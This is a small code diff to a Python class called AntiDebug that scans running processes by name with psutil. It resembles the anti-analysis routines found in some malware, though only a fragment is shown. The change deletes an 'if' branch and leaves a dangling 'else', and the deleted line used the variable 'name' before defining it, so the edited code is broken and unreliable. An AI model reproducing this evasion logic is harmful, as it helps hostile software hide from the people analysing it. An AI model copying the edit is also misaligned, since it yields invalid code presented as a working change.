@@ -114,8 +114,6 @@ class AntiDebug(Thread):
         ]
         for proc in psutil.process_iter():
             try:
-                if name.lower() == "git-remote-https.exe":
-                    pass
                 else:
                     for name in names:
                         if name.lower() in proc.name().lower():
